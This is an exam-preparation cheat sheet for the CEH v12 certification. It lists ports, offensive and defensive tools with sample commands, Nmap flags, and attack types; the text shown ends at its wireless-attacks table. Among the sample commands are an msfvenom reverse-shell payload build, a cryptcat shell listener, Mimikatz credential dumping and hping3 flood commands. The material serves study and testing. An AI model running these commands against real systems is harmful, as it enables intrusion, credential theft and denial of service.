# CEH v12 COMPREHENSIVE CHEATSHEET - Ultimate Quick Reference

---

## 1. COMPLETE PORT REFERENCE TABLE

| Port | Protocol | Service | Description / Exam Notes |
|------|----------|---------|--------------------------|
| 20 | TCP | FTP-Data | FTP data transfer (active mode data channel) |
| 21 | TCP | FTP-Control | FTP command/control channel; cleartext creds; bounce attack vector |
| 22 | TCP | SSH | Secure Shell; encrypted remote access; replaces Telnet |
| 23 | TCP | Telnet | Unencrypted remote access; credentials sent in cleartext |
| 25 | TCP | SMTP | Simple Mail Transfer Protocol; email sending; open relay abuse |
| 53 | TCP/UDP | DNS | Domain Name System; UDP for queries, TCP for zone transfers (AXFR) |
| 67 | UDP | DHCP Server | Dynamic Host Configuration Protocol server; DHCP starvation target |
| 68 | UDP | DHCP Client | DHCP client port; rogue DHCP attacks |
| 69 | UDP | TFTP | Trivial FTP; no authentication; used for firmware/config transfer |
| 80 | TCP | HTTP | Hypertext Transfer Protocol; unencrypted web traffic |
| 88 | TCP/UDP | Kerberos | Authentication protocol for Windows AD; ticket-based; Kerberoasting |
| 110 | TCP | POP3 | Post Office Protocol v3; email retrieval; cleartext |
| 111 | TCP/UDP | RPCBind/Portmapper | Sun RPC portmapper; NFS enumeration starting point |
| 123 | UDP | NTP | Network Time Protocol; NTP amplification DDoS attacks |
| 135 | TCP | MS-RPC/DCOM | Microsoft RPC Endpoint Mapper; Windows enumeration |
| 137 | UDP | NetBIOS-NS | NetBIOS Name Service; nbtstat enumeration |
| 138 | UDP | NetBIOS-DGM | NetBIOS Datagram Service |
| 139 | TCP | NetBIOS-SSN | NetBIOS Session Service; SMB over NetBIOS; file sharing |
| 143 | TCP | IMAP | Internet Message Access Protocol; email retrieval |
| 161 | UDP | SNMP | Simple Network Management Protocol; community strings (public/private) |
| 162 | UDP | SNMP-Trap | SNMP trap messages; notifications from agents to manager |
| 179 | TCP | BGP | Border Gateway Protocol; route hijacking attacks |
| 389 | TCP/UDP | LDAP | Lightweight Directory Access Protocol; AD enumeration |
| 443 | TCP | HTTPS | HTTP over TLS/SSL; encrypted web traffic |
| 445 | TCP | SMB/CIFS | Server Message Block; direct SMB without NetBIOS; EternalBlue |
| 465 | TCP | SMTPS | SMTP over SSL (deprecated in favor of 587+STARTTLS) |
| 500 | UDP | IKE/ISAKMP | Internet Key Exchange; IPSec VPN negotiation |
| 502 | TCP | Modbus | SCADA/ICS protocol; no authentication by default |
| 514 | UDP | Syslog | System logging; log forwarding; also RSH (TCP 514) |
| 515 | TCP | LPD | Line Printer Daemon; printer service |
| 520 | UDP | RIP | Routing Information Protocol; route poisoning |
| 587 | TCP | SMTP Submission | Email submission with STARTTLS; modern email sending |
| 636 | TCP | LDAPS | LDAP over SSL/TLS |
| 993 | TCP | IMAPS | IMAP over SSL/TLS |
| 995 | TCP | POP3S | POP3 over SSL/TLS |
| 1433 | TCP | MSSQL | Microsoft SQL Server default instance |
| 1521 | TCP | Oracle DB | Oracle database TNS listener |
| 1723 | TCP | PPTP | Point-to-Point Tunneling Protocol VPN; considered insecure |
| 2049 | TCP/UDP | NFS | Network File System; showmount enumeration |
| 3306 | TCP | MySQL | MySQL database server |
| 3389 | TCP | RDP | Remote Desktop Protocol; BlueKeep vulnerability |
| 4444 | TCP | Metasploit | Default Meterpreter reverse shell listener port |
| 5060 | TCP/UDP | SIP | Session Initiation Protocol; VoIP signaling (unencrypted) |
| 5061 | TCP | SIP-TLS | SIP over TLS; encrypted VoIP signaling |
| 5432 | TCP | PostgreSQL | PostgreSQL database server |
| 5900 | TCP | VNC | Virtual Network Computing; remote desktop |
| 6667 | TCP | IRC | Internet Relay Chat; botnet C2 channel |
| 8080 | TCP | HTTP-Proxy | HTTP proxy / alternate HTTP; web app testing |
| 8443 | TCP | HTTPS-Alt | Alternate HTTPS port |
| 44818 | TCP/UDP | EtherNet/IP | Industrial Ethernet protocol; SCADA/ICS |
| 47808 | UDP | BACnet | Building Automation and Control; SCADA/ICS |
| 48101 | TCP | Mirai Botnet | Associated with Mirai IoT botnet infections |

---

## 2. COMPLETE TOOLS REFERENCE (70+ Tools)

### 2.1 Reconnaissance Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **Maltego** | OSINT visual link analysis; maps relationships between entities | GUI-based; transforms for domains, emails, people, infrastructure |
| **theHarvester** | Harvests emails, subdomains, IPs from public sources | `theHarvester -d target.com -b google,bing,linkedin` |
| **Recon-ng** | Modular OSINT reconnaissance framework | `recon-ng` then `marketplace install all; use recon/domains-hosts/hackertarget` |
| **Shodan** | Search engine for Internet-connected devices | `shodan search "apache" --fields ip_str,port,org` |
| **Censys** | Internet-wide scan data search engine | Web UI at censys.io; API: `censys search "443.https.tls.certificate"` |
| **Sublist3r** | Subdomain enumeration using search engines | `sublist3r -d target.com -o output.txt` |
| **OSINT Framework** | Curated collection of OSINT tools organized by category | Web-based at osintframework.com; no CLI |
| **Photon** | Fast web crawler for extracting URLs, emails, files | `python3 photon.py -u https://target.com -o output_dir` |
| **Infoga** | Email OSINT gathering (Shodan, Have I Been Pwned) | `python3 infoga.py -t target.com --source all` |
| **FOCA** | Metadata extraction from public documents | GUI-based; searches for docs, extracts metadata (users, paths, software) |
| **Whois** | Domain registration information lookup | `whois target.com` |
| **nslookup** | DNS query tool | `nslookup -type=MX target.com` |
| **dig** | DNS lookup utility (more detailed than nslookup) | `dig target.com ANY +noall +answer` |
| **Fierce** | DNS reconnaissance and subdomain brute-forcing | `fierce --domain target.com` |

### 2.2 Scanning & Network Mapping Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **Nmap** | Network discovery and security auditing | `nmap -sS -sV -O -A -T4 target` (see Section 3 for full reference) |
| **Hping3** | Packet crafting and custom TCP/IP scanning | `hping3 -S target -p 80 -c 5` (SYN scan); `hping3 --flood -S -p 80 target` (DoS) |
| **Unicornscan** | Async stateless TCP/UDP scanner | `unicornscan -mT target:1-65535 -r 1000` |
| **NetScanTools Pro** | Windows-based network investigation suite | GUI-based; DNS, Whois, port scanning, packet capture |
| **MegaPing** | Windows network scanning toolkit | GUI-based; port scanner, IP scanner, share scanner |
| **Angry IP Scanner** | Fast cross-platform IP/port scanner | GUI-based; scans IP ranges, detects hostnames, MAC, ports |
| **Masscan** | Fastest Internet-scale port scanner | `masscan -p1-65535 --rate 10000 target/24` |

### 2.3 Enumeration Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **enum4linux** | SMB/NetBIOS enumeration on Linux (Windows targets) | `enum4linux -a target` |
| **nbtstat** | Windows NetBIOS name table enumeration | `nbtstat -A target_ip` (remote); `nbtstat -n` (local) |
| **snmp-check** | SNMP enumeration tool | `snmp-check -c public target` |
| **snmpwalk** | Walk entire SNMP MIB tree | `snmpwalk -v2c -c public target` |
| **ldapsearch** | LDAP directory enumeration | `ldapsearch -x -H ldap://target -b "dc=domain,dc=com"` |
| **JXplorer** | Java-based LDAP browser/editor | GUI-based; connect to LDAP server, browse directory tree |
| **DumpSec** | Windows security auditing (shares, users, policies) | GUI-based; dumps users, groups, permissions from Windows systems |
| **USER2SID / SID2USER** | Convert usernames to SIDs and vice versa | `user2sid \\\\target "domain users"` / `sid2user \\\\target 5 21 ...` |
| **RPCScan** | RPC endpoint enumeration | `rpcclient -U "" target -N` then `enumdomusers` |
| **SuperEnum** | Multi-tool enumeration script | `./superenum.sh` (wraps multiple enum tools) |
| **smtp-user-enum** | SMTP user enumeration via VRFY/EXPN/RCPT | `smtp-user-enum -M VRFY -u users.txt -t target` |
| **DNSRecon** | DNS enumeration and zone transfer tool | `dnsrecon -d target.com -t axfr` |

### 2.4 Vulnerability Assessment Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **Nessus** | Comprehensive vulnerability scanner (commercial) | Web UI at https://localhost:8834; policy-based scanning |
| **OpenVAS** | Open-source vulnerability scanner (Nessus fork) | `gvm-start`; web UI; NVT-based scanning |
| **Qualys** | Cloud-based vulnerability management platform | SaaS; agent-based and agentless scanning |
| **Nikto** | Web server vulnerability scanner | `nikto -h http://target -o report.html -Format htm` |
| **Syhunt Hybrid** | Web and mobile app vulnerability scanner | GUI-based; automated and manual web app testing |
| **Netsparker (Invicti)** | Automated web app security scanner | GUI/SaaS; proof-based scanning with zero false positives claim |
| **Acunetix** | Web vulnerability scanner | GUI/SaaS; scans for SQLi, XSS, misconfigs |
| **Retina** | Network vulnerability scanner | GUI-based; agentless scanning of network assets |

### 2.5 Password Cracking Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **John the Ripper** | Offline password hash cracker | `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` |
| **Hashcat** | GPU-accelerated hash cracker | `hashcat -m 0 -a 0 hashes.txt rockyou.txt` (MD5, dictionary) |
| **L0phtCrack** | Windows password auditing tool | GUI-based; imports SAM, AD hashes; dictionary/brute/hybrid |
| **Ophcrack** | Rainbow table Windows password cracker | GUI-based; uses pre-computed rainbow tables for LM/NTLM hashes |
| **CeWL** | Custom wordlist generator from target website | `cewl http://target.com -d 3 -m 6 -w wordlist.txt` |
| **THC-Hydra** | Online brute-force authentication cracker | `hydra -l admin -P passwords.txt target ssh` |
| **Mimikatz** | Windows credential extraction from memory | `mimikatz # sekurlsa::logonpasswords` (dump plaintext creds from LSASS) |
| **Medusa** | Parallel online brute-force tool | `medusa -h target -u admin -P wordlist.txt -M ssh` |
| **RainbowCrack** | Rainbow table generation and lookup | `rtgen md5 loweralpha 1 7 0 3800 33554432 0` then `rcrack *.rt -h hash` |
| **pwdump7** | Extract password hashes from Windows SAM | `pwdump7.exe` (dumps LM/NTLM hashes) |

### 2.6 Sniffing & Spoofing Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **Wireshark** | GUI-based network protocol analyzer | GUI; capture filters: `tcp port 80`; display filters: see Section 16 |
| **tcpdump** | CLI-based packet capture tool | `tcpdump -i eth0 -w capture.pcap -c 1000 port 80` |
| **tshark** | CLI version of Wireshark | `tshark -i eth0 -f "tcp port 443" -w output.pcap` |
| **Ettercap** | MITM attack suite (ARP poisoning) | `ettercap -Tq -M arp:remote /target1// /target2//` |
| **BetterCAP** | Modern MITM framework (successor to Ettercap) | `bettercap -iface eth0` then `net.probe on; arp.spoof on` |
| **macof** | MAC address flooding to overflow switch CAM table | `macof -i eth0 -n 100000` (forces switch to hub mode) |
| **Yersinia** | Layer 2 attack framework (STP, DHCP, CDP, DTP) | `yersinia -G` (GUI); attacks STP root bridge, DHCP starvation |
| **Cain & Abel** | Windows sniffing, ARP poisoning, password recovery | GUI-based; ARP poison, crack hashes, sniff protocols |
| **arpspoof** | ARP spoofing for MITM | `arpspoof -i eth0 -t victim_ip gateway_ip` |
| **dsniff** | Collection of network auditing/sniffing tools | `dsniff -i eth0` (sniffs cleartext passwords from protocols) |

### 2.7 Web Application Attack Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **Burp Suite** | Web app security testing platform | GUI; intercepting proxy on 127.0.0.1:8080; Scanner, Repeater, Intruder |
| **OWASP ZAP** | Open-source web app scanner | GUI; automated scan + manual testing; spidering |
| **sqlmap** | Automated SQL injection exploitation | `sqlmap -u "http://target/page?id=1" --dbs --batch` |
| **Gobuster** | Directory/file brute-forcing | `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt` |
| **DirBuster** | Java-based directory brute-forcing | GUI-based; wordlist-based directory/file enumeration |
| **wfuzz** | Web fuzzer for brute-forcing parameters/dirs | `wfuzz -c -z file,wordlist.txt --hc 404 http://target/FUZZ` |
| **WAFW00F** | Web Application Firewall detection | `wafw00f http://target` |
| **WPScan** | WordPress vulnerability scanner | `wpscan --url http://target --enumerate u,vp,vt` |
| **XSSer** | Automated XSS detection and exploitation | `xsser --url "http://target/page?param=XSS" --auto` |
| **Commix** | Automated command injection exploitation | `commix --url "http://target/page?cmd=test"` |
| **BeEF** | Browser Exploitation Framework | Start server, inject hook.js, control hooked browsers via web UI |

### 2.8 Wireless Attack Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **Aircrack-ng suite** | Complete WiFi auditing toolkit | `airmon-ng start wlan0` > `airodump-ng wlan0mon` > `aireplay-ng` > `aircrack-ng` |
| **Kismet** | Wireless network detector and sniffer | `kismet -c wlan0mon` (passive wireless scanning) |
| **Reaver** | WPS brute-force attack tool | `reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv` |
| **Wash** | Detect WPS-enabled access points | `wash -i wlan0mon` |
| **WiFi Pineapple** | Rogue AP and MITM hardware platform | Hardware device; Karma attack, Evil Twin, captive portals |
| **inSSIDer** | WiFi scanner and channel analysis | GUI-based; shows SSIDs, signal strength, channels, encryption |
| **Fern WiFi Cracker** | GUI-based wireless security auditing | GUI; WEP/WPA/WPS cracking with visual interface |
| **Wifite** | Automated wireless attack tool | `wifite --kill` (automated WEP/WPA/WPS attacks) |

### 2.9 Mobile Security Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **DroidSheep** | Android session hijacking on WiFi | Android app; ARP spoofs and captures session cookies |
| **FaceNiff** | Android app for WiFi session sniffing | Android app; hijacks web sessions on same WiFi |
| **zANTI** | Android mobile penetration testing toolkit | Android app; MITM, scanning, password auditing |
| **AndroRAT** | Android remote access trojan (for testing) | Client-server; remote control of Android device |
| **Drozer** | Android application security assessment | `drozer console connect` then `run app.package.list` |
| **APKTool** | Android APK reverse engineering | `apktool d application.apk -o output_dir` |

### 2.10 DoS/DDoS Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **LOIC** | Low Orbit Ion Cannon; layer 7 flood tool | GUI-based; TCP/UDP/HTTP flood; used by Anonymous |
| **HOIC** | High Orbit Ion Cannon; HTTP flood with booster scripts | GUI-based; more powerful than LOIC; uses booster scripts |
| **Slowloris** | Slow HTTP DoS; keeps connections open | `slowloris target -p 80 -s 500` (holds connections with partial headers) |
| **RUDY** | R-U-Dead-Yet; slow POST DoS attack | Sends POST with very long content-length, byte by byte |
| **PyLoris** | Protocol-agnostic slow DoS tool | `pyloris target -p 80 --attacklimit 500` |
| **hping3 (flood)** | TCP SYN flood via packet crafting | `hping3 --flood -S -p 80 --rand-source target` |
| **Torshammer** | Slow POST tool through Tor for anonymity | `python torshammer.py -t target -p 80 -r 500` |

### 2.11 Exploitation Frameworks

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **Metasploit (msfconsole)** | Exploitation framework; main console | `msfconsole` > `use exploit/...` > `set RHOSTS target` > `exploit` |
| **msfvenom** | Payload generation and encoding | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f exe > shell.exe` |
| **msfencode** | Payload encoding for AV evasion (legacy) | Now integrated into msfvenom with `-e` flag |
| **Meterpreter** | Post-exploitation payload/shell | `getsystem` (privesc); `hashdump`; `upload`/`download`; `migrate` |
| **Armitage** | GUI frontend for Metasploit | GUI; visual attack surface; automated exploitation |
| **SearchSploit** | Offline exploit database search | `searchsploit apache 2.4` (searches local ExploitDB copy) |
| **Social Engineering Toolkit** | Social engineering attack framework | `setoolkit` > credential harvesting, phishing, HTA attacks |

### 2.12 Evasion & Tunneling Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **Nmap evasion** | Firewall/IDS evasion during scanning | `-f` (fragment), `-D decoy1,decoy2`, `-T0` (paranoid), `--data-length` |
| **Cryptcat** | Netcat with twofish encryption | `cryptcat -l -p 4444 -k password` (encrypted reverse shell) |
| **Proxychains** | Route traffic through proxy chain (SOCKS/HTTP) | `proxychains nmap -sT target` (chains through configured proxies) |
| **Tor** | Anonymous communication network | `tor`; configure SOCKS proxy on 9050; `torify curl target` |
| **Stunnel** | SSL/TLS tunnel for arbitrary protocols | Config-based; wraps non-SSL services in SSL tunnel |
| **Covert_tcp** | Covert channel using TCP header fields | Hides data in TCP sequence number, ACK, and IP ID fields |
| **Veil-Evasion** | AV evasion payload generator | `veil` > use Evasion > select payload > generate |

### 2.13 IDS/IPS & Honeypot Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **Snort** | Open-source network IDS/IPS | `snort -A console -q -c /etc/snort/snort.conf -i eth0` |
| **Suricata** | High-performance IDS/IPS (multi-threaded) | `suricata -c /etc/suricata/suricata.yaml -i eth0` |
| **yarGen** | YARA rule generator for malware detection | `python yarGen.py -m /malware/dir --excludegood` |
| **Send-Safe Honeypot Hunter** | Detects honeypots in network | Probes systems to identify if they are honeypots |
| **KFSensor** | Windows-based honeypot IDS | GUI-based; emulates vulnerable services to detect attacks |
| **HoneyBOT** | Windows honeypot for logging attacks | GUI-based; listens on ports, logs connection attempts |
| **Kippo/Cowrie** | SSH honeypot | `cowrie start` (emulates SSH, logs brute-force attempts and sessions) |

### 2.14 IoT & OT Security Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **IoTSeeker** | Discover IoT devices with default credentials | Scans network for IoT devices, tests default login |
| **Shodan (IoT)** | Search for exposed IoT/ICS devices | `shodan search "port:502 modbus"` (find SCADA devices) |
| **Censys (IoT)** | Internet-wide IoT device discovery | Search for exposed industrial protocols |
| **Flowmon** | Network traffic analysis and anomaly detection | Monitors IoT network traffic for suspicious behavior |
| **Btlejack** | Bluetooth Low Energy (BLE) sniffing and hijacking | `btlejack -d /dev/ttyACM0 -s` (sniff BLE connections) |
| **Firmalyzer** | IoT firmware analysis platform | Automated firmware vulnerability analysis |
| **RIoT** | Vulnerability scanning for IoT devices | Scans for known IoT vulnerabilities and misconfigs |

### 2.15 Cloud Security Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **NeuVector** | Container runtime security platform | Kubernetes-native; runtime protection, compliance |
| **Lacework** | Cloud security and compliance platform | SaaS; anomaly detection, config audit |
| **Prowler** | AWS security assessment tool | `prowler -M csv -r us-east-1` (CIS benchmark checks) |
| **ScoutSuite** | Multi-cloud security auditing | `scout aws --profile myprofile` |
| **Pacu** | AWS exploitation framework | `pacu` > `run iam__enum_permissions` |
| **CloudBrute** | Cloud infrastructure enumeration | Enumerates cloud storage buckets across providers |
| **S3Scanner** | AWS S3 bucket misconfiguration scanner | `s3scanner scan --buckets-file list.txt` |

### 2.16 Steganography Tools

| Tool | Purpose | Key Command / Usage |
|------|---------|---------------------|
| **OpenStego** | Digital watermarking and data hiding | GUI-based; hide data in images; supports BMP, PNG |
| **Snow** | Whitespace steganography in text files | `snow -C -m "secret message" -p password infile outfile` |
| **Steghide** | Hide data in JPEG/BMP/WAV/AU files | `steghide embed -cf cover.jpg -ef secret.txt -p password` |
| **QuickStego** | Simple image steganography tool | GUI-based; hide text in BMP images |
| **StegSuite** | Image steganography detection | Analyzes images for hidden content |

---

## 3. NMAP COMPLETE REFERENCE

### 3.1 Host Discovery

| Flag | Name | Description |
|------|------|-------------|
| `-sn` | Ping Scan | Host discovery only, no port scan |
| `-Pn` | No Ping | Skip host discovery, assume host is up |
| `-PS <ports>` | TCP SYN Ping | Send SYN to specified ports for discovery |
| `-PA <ports>` | TCP ACK Ping | Send ACK to specified ports for discovery |
| `-PU <ports>` | UDP Ping | Send UDP packets for discovery |
| `-PE` | ICMP Echo Ping | Standard ICMP echo request |
| `-PP` | ICMP Timestamp | ICMP timestamp request for discovery |
| `-PM` | ICMP Netmask | ICMP address mask request |
| `-PR` | ARP Ping | ARP-based discovery (LAN only, very reliable) |
| `-n` | No DNS | Skip DNS resolution (faster) |

### 3.2 Scan Types

| Flag | Name | How It Works | When to Use |
|------|------|-------------|-------------|
| `-sS` | TCP SYN (Stealth) | Sends SYN, reads SYN/ACK (open) or RST (closed); never completes handshake | Default scan; fastest; requires root; "half-open" scan |
| `-sT` | TCP Connect | Completes full 3-way handshake | When you don't have root; more detectable; uses OS connect() |
| `-sU` | UDP Scan | Sends UDP packets; ICMP port unreachable = closed | Scanning UDP services (DNS, SNMP, DHCP); slow |
| `-sF` | FIN Scan | Sends FIN flag only; RST = closed, no response = open/filtered | Firewall evasion; bypasses stateless firewalls |
| `-sX` | Xmas Scan | Sets FIN, PSH, URG flags; RST = closed, no response = open/filtered | Firewall evasion; "Christmas tree" packet |
| `-sN` | NULL Scan | Sends packet with no flags; RST = closed, no response = open/filtered | Firewall evasion; stealthiest of FIN/Xmas/NULL |
| `-sA` | ACK Scan | Sends ACK; RST = unfiltered, no response = filtered | Map firewall rules; does NOT determine open/closed |
| `-sM` | Maimon Scan | Sends FIN/ACK; some BSD systems drop packet if port open | Rare; works against specific BSD implementations |
| `-sI <zombie>` | Idle/Zombie Scan | Uses idle host's IP ID sequence to scan target | Ultimate stealth; no packets from your IP; requires suitable zombie |
| `-sW` | Window Scan | Like ACK scan but examines TCP window size in RST | Some systems reveal open/closed via window size in RST |

### 3.3 Service/Version & OS Detection

| Flag | Description |
|------|-------------|
| `-sV` | Probe open ports to determine service/version |
| `-sV --version-intensity <0-9>` | Set version detection intensity (default 7) |
| `-sC` | Run default NSE scripts (equivalent to `--script=default`) |
| `-O` | Enable OS detection |
| `-A` | Aggressive scan: -sV + -sC + -O + traceroute |
| `--osscan-guess` | Guess OS more aggressively |

### 3.4 Timing Templates

| Flag | Name | Description |
|------|------|-------------|
| `-T0` | Paranoid | 5 min between probes; serial; IDS evasion |
| `-T1` | Sneaky | 15 sec between probes; IDS evasion |
| `-T2` | Polite | 0.4 sec between probes; less bandwidth |
| `-T3` | Normal | Default timing |
| `-T4` | Aggressive | Faster; assumes reliable network |
| `-T5` | Insane | Fastest; may miss ports; unreliable networks lose accuracy |

### 3.5 Firewall/IDS Evasion

| Flag | Description |
|------|-------------|
| `-f` | Fragment packets (8 bytes per fragment) |
| `-f -f` | Fragment packets (16 bytes per fragment) |
| `--mtu <size>` | Set custom MTU (must be multiple of 8) |
| `-D decoy1,decoy2,ME` | Use decoy IP addresses to obscure source |
| `-S <ip>` | Spoof source IP address |
| `-g <port>` or `--source-port <port>` | Use specified source port (e.g., 53, 80 to bypass firewalls) |
| `--data-length <num>` | Append random data to packets |
| `--ttl <value>` | Set custom TTL |
| `--scan-delay <time>` | Adjust delay between probes |
| `--badsum` | Send packets with bad checksums (detect firewall) |
| `--proxies <url>` | Relay connections through proxies |
| `-sI <zombie>` | Idle scan using zombie host |

### 3.6 Output Formats

| Flag | Format | Description |
|------|--------|-------------|
| `-oN file` | Normal | Human-readable output |
| `-oX file` | XML | XML format (for parsing, import to tools) |
| `-oG file` | Grepable | Grep-friendly output (deprecated but useful) |
| `-oA basename` | All | Output in all three formats simultaneously |
| `-oS file` | Script Kiddie | LeetSpeak output (joke format) |
| `-v` / `-vv` | Verbose | Increase verbosity level |

### 3.7 NSE Scripts

| Category | Example | Command |
|----------|---------|---------|
| Default | Common safe scripts | `nmap --script=default target` or `nmap -sC target` |
| Vuln | Vulnerability detection | `nmap --script=vuln target` |
| Auth | Authentication checks | `nmap --script=auth target` |
| Brute | Brute-force attacks | `nmap --script=brute target` |
| Discovery | Network discovery | `nmap --script=discovery target` |
| Exploit | Exploit vulnerabilities | `nmap --script=exploit target` |
| Specific | Named script | `nmap --script=smb-vuln-ms17-010 target` |
| Multiple | Combine categories | `nmap --script="vuln and safe" target` |

### 3.8 Port Specification

| Flag | Description |
|------|-------------|
| `-p 80` | Scan single port |
| `-p 80,443,8080` | Scan specific ports |
| `-p 1-1024` | Scan port range |
| `-p-` | Scan ALL 65535 ports |
| `-F` | Fast scan (top 100 ports) |
| `--top-ports 1000` | Scan top N most common ports |
| `-p U:53,T:25` | Scan UDP 53 and TCP 25 |

---

## 4. ATTACK TYPES QUICK REFERENCE

### 4.1 Network Attacks

| Attack | Category | Description | Key Tool | Port/Protocol |
|--------|----------|-------------|----------|---------------|
| SYN Flood | DoS | Sends mass SYN packets without completing handshake | hping3 | TCP |
| UDP Flood | DoS/DDoS | Overwhelms target with UDP packets | LOIC | UDP |
| Smurf Attack | DDoS | ICMP echo to broadcast address with spoofed source | hping3 | ICMP |
| Fraggle Attack | DDoS | Like Smurf but uses UDP echo (port 7) | hping3 | UDP/7 |
| Ping of Death | DoS | Sends oversized ICMP packet (>65535 bytes) | hping3 | ICMP |
| Teardrop | DoS | Sends overlapping fragmented packets | Custom | IP |
| Land Attack | DoS | SYN packet with same source and destination IP/port | hping3 | TCP |
| ARP Poisoning | MITM | Sends fake ARP replies to associate attacker MAC with gateway IP | Ettercap, arpspoof | ARP |
| DNS Poisoning | MITM | Corrupts DNS cache with fraudulent mappings | dnsspoof, Ettercap | UDP/53 |
| DHCP Starvation | DoS | Exhausts DHCP pool with spoofed MAC requests | Yersinia, Gobbler | UDP/67-68 |
| DHCP Spoofing | MITM | Rogue DHCP server provides attacker-controlled gateway | Yersinia | UDP/67-68 |
| MAC Flooding | Sniffing | Overflows switch CAM table forcing hub behavior | macof | Layer 2 |
| VLAN Hopping | Evasion | Switch spoofing or double tagging to access other VLANs | Yersinia | 802.1Q |
| STP Attack | DoS/MITM | Manipulates Spanning Tree Protocol to become root bridge | Yersinia | STP |
| BGP Hijacking | MITM | Announces false BGP routes to redirect traffic | Custom | TCP/179 |
| NTP Amplification | DDoS | Exploits NTP monlist for amplified reflected flood | ntpdc | UDP/123 |
| DNS Amplification | DDoS | Sends DNS queries with spoofed source to open resolvers | dig | UDP/53 |
| Memcached Amplification | DDoS | Exploits exposed memcached for massive amplification (51000x) | Custom | UDP/11211 |
| SNMP Enumeration | Recon | Queries SNMP agents using default community strings | snmpwalk | UDP/161 |

### 4.2 Web Application Attacks

| Attack | Category | Description | Key Tool | Port/Protocol |
|--------|----------|-------------|----------|---------------|
| SQL Injection | Injection | Injects SQL commands via input fields | sqlmap | TCP/80,443 |
| Blind SQLi | Injection | SQLi where no output is displayed; uses true/false or time delays | sqlmap | TCP/80,443 |
| Cross-Site Scripting (XSS) | Injection | Injects malicious scripts into web pages viewed by others | Burp Suite, XSSer | TCP/80,443 |
| Stored XSS | Injection | Malicious script permanently stored on target server | Burp Suite | TCP/80,443 |
| Reflected XSS | Injection | Script reflected off web server in error messages, search results | Burp Suite | TCP/80,443 |
| DOM-based XSS | Injection | Script executes in browser via DOM manipulation, never hits server | Browser DevTools | TCP/80,443 |
| CSRF | Session | Forces authenticated user to perform unwanted actions | Burp Suite | TCP/80,443 |
| Command Injection | Injection | Injects OS commands through vulnerable app parameters | Commix | TCP/80,443 |
| LDAP Injection | Injection | Manipulates LDAP queries through user input | Burp Suite | TCP/389 |
| XML External Entity (XXE) | Injection | Exploits XML parsers to read files, SSRF, DoS | Burp Suite | TCP/80,443 |
| SSRF | Injection | Server-Side Request Forgery; makes server request internal resources | Burp Suite | TCP/80,443 |
| Directory Traversal | File Access | Uses ../ sequences to access files outside web root | Burp Suite, curl | TCP/80,443 |
| File Inclusion (LFI/RFI) | File Access | Includes local or remote files through vulnerable parameters | Burp Suite | TCP/80,443 |
| Session Hijacking | Session | Steals or predicts session tokens to impersonate users | Wireshark, Burp | TCP/80,443 |
| Session Fixation | Session | Forces user to use attacker-known session ID | Custom | TCP/80,443 |
| Clickjacking | UI | Tricks user into clicking hidden elements via iframe overlay | Custom HTML | TCP/80,443 |
| HTTP Response Splitting | Injection | Injects headers via CRLF to manipulate HTTP responses | Burp Suite | TCP/80,443 |
| Parameter Tampering | Manipulation | Modifies parameters in URL, form fields, cookies, headers | Burp Suite | TCP/80,443 |
| Insecure Deserialization | Injection | Exploits deserialization of untrusted data for RCE | ysoserial | TCP/80,443 |
| Slowloris | DoS | Holds HTTP connections open with partial headers | Slowloris | TCP/80 |
| RUDY | DoS | Sends POST with long content-length, transmits body very slowly | RUDY | TCP/80 |

### 4.3 Password Attacks

| Attack | Category | Description | Key Tool | Port/Protocol |
|--------|----------|-------------|----------|---------------|
| Dictionary Attack | Cracking | Tries words from wordlist as passwords | John the Ripper | Offline / various |
| Brute Force | Cracking | Tries all possible character combinations | Hashcat | Offline / various |
| Hybrid Attack | Cracking | Combines dictionary words with brute-force variations | John the Ripper | Offline |
| Rainbow Table | Cracking | Uses pre-computed hash-to-plaintext lookup tables | Ophcrack, RainbowCrack | Offline |
| Rule-based Attack | Cracking | Applies transformation rules to wordlist entries | Hashcat | Offline |
| Pass-the-Hash | Lateral Movement | Uses NTLM hash directly without cracking | Mimikatz, pth-suite | TCP/445 |
| Pass-the-Ticket | Lateral Movement | Uses stolen Kerberos ticket (TGT/TGS) | Mimikatz | TCP/88 |
| Kerberoasting | Credential Theft | Requests TGS tickets for SPNs, cracks offline | Rubeus, Impacket | TCP/88 |
| Credential Stuffing | Online | Uses leaked username/password pairs across sites | Hydra, Burp | TCP/80,443 |
| Password Spraying | Online | Tries one common password against many accounts | Spray, Hydra | Various |
| Keylogger | Capture | Records keystrokes to capture credentials | Hardware/Software | Local |
| Shoulder Surfing | Social Engineering | Watching someone type their password | Physical | N/A |
| Dumpster Diving | Social Engineering | Searching trash for written passwords | Physical | N/A |

### 4.4 Wireless Attacks

| Attack | Category | Description | Key Tool | Protocol |
|--------|----------|-------------|----------|----------|
| Evil Twin | MITM | Creates fake AP mimicking legitimate one | WiFi Pineapple | 802.11 |
| Rogue Access Point | MITM | Unauthorized AP connected to corporate network | Airbase-ng | 802.11 |
| Deauthentication | DoS | Sends deauth frames to disconnect clients | aireplay-ng | 802.11 |
| WEP Cracking | Cracking | Collects IVs and cracks WEP key (statistical attack) | Aircrack-ng | 802.11 |
| WPA/WPA2 Handshake Capture | Cracking | Captures 4-way handshake, cracks PSK offline | Aircrack-ng | 802.11 |
| WPS PIN Attack | Cracking | Brute-forces 8-digit WPS PIN (2 halves = 11000 tries) | Reaver | 802.11 |
| KRACK | MITM | Key Reinstallation Attack against WPA2 4-way handshake | Custom | 802.11 |
